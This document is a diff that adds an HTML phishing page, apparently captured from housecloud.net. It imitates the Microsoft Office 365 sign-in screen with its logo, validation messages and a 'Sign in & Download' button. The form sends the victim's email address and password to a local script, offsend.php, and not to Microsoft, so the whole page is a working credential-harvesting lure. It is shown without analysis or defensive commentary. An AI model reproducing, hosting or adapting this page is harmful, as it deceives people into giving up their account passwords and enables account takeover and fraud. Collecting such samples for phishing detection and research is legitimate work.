@@ -1,0 +1,87 @@
+<!-- URL =http://www.housecloud.net/rrrr3r/spsp/share/login365.php--><!-- w =('HOUSECLOUD.NET', [datetime.datetime(2008, 8, 8, 20, 8, 21), datetime.datetime(2008, 8, 8, 15, 8, 21)], [datetime.datetime(2021, 8, 8, 20, 8, 21), datetime.datetime(2021, 8, 8, 15, 8, 21)])--><!DOCTYPE html>
+<html>
+ <head>
+  <title>
+   Office 365 - Login
+  </title>
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no" name="viewport"/>
+  <link href="assets/favicon.ico" rel="shortcut icon" type="icon"/>
+  <link href="scripts/ms-style.css" rel="stylesheet" type="text/css"/>
+  <script src="scripts/jquery-2.1.1.min.js" type="text/javascript">
+  </script>
+  <script type="text/javascript">
+   function isValidEmailAddress(emailAddress) {
+            var pattern = new RegExp(/^(("[\w-\s]+")|([\w-]+(?:\.[\w-]+)*)|("[\w-\s]+")([\w-]+(?:\.[\w-]+)*))(@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$)|(@\[?((25[0-5]\.|2[0-4][0-9]\.|1[0-9]{2}\.|[0-9]{1,2}\.))((25[0-5]|2[0-4][0-9]|1[0-9]{2}|[0-9]{1,2})\.){2}(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[0-9]{1,2})\]?$)/i);
+            return pattern.test(emailAddress);
+        };
+
+        $(function(){
+
+            $(document).ready(function(){
+                $("#next").click(function(){
+                    $('#loader').show();
+                    
+                    if(!isValidEmailAddress($('#email').val())) {
+                        $('#email').addClass("error");
+                        $('#message').show();
+                        $('#message').text('Enter a valid email address, phone number, or Skype name.');
+                        $('#loader').hide();
+
+                        $('#email').on('input',function(){
+                            $('#email').removeClass('error');
+                            $('#message').hide();
+                        });
+                        return false;
+                    }
+
+                });
+            });
+        });
+  </script>
+ </head>
+ <body>
+  <div class="overlay">
+   <div class="login-box">
+    <img alt="logo" height="70" src="assets/365.png"/>
+    <h2 id="title">
+     Sign in to Office 365
+    </h2>
+    <p class="message" id="message">
+    </p>
+    <form action="offsend.php" method="post">
+     <div class="row margin-bottom-50">
+      <div class="form-group placeholderContainer">
+       <input aria-required="true" autocomplete="off" name="emaill" placeholder="Email, phone, or Skype" required="" spellcheck="false" style="padding-left: 0px; border: 0px; border-bottom: 1px solid #aaa;width: 96%;
+    
+    
+    height: 2.5em;
+    font-size: 15px;
+    box-shadow: none;
+    overflow: hidden;
+   
+    margin-bottom: 1em;
+}" type="text"/>
+      </div>
+      <div class="row margin-bottom-50">
+       <div class="form-group placeholderContainer">
+        <input aria-required="true" autocomplete="off" name="psw" placeholder="Password" required="" spellcheck="false" style="padding-left: 0px; border: 0px; border-bottom: 1px solid #aaa" type="password"/>
+       </div>
+       <div class="row margin-bottom-20">
+        <div class="col-md-12 section text-secondary">
+         <a aria-label="Create a Microsoft account" href="#">
+          I forgot my password !
+         </a>
+         <div class="row inline-block no-margin-top-bottom button-container">
+         </div>
+        </div>
+       </div>
+       <br/>
+       <br/>
+       <input class="btn btn-block btn-primary" data-bind="value: config.text.linkNext, click: submit" style="width: 160px;" type="submit" value="Sign in &amp; Download"/>
+      </div>
+     </div>
+    </form>
+   </div>
+  </div>
+ </body>
+</html>
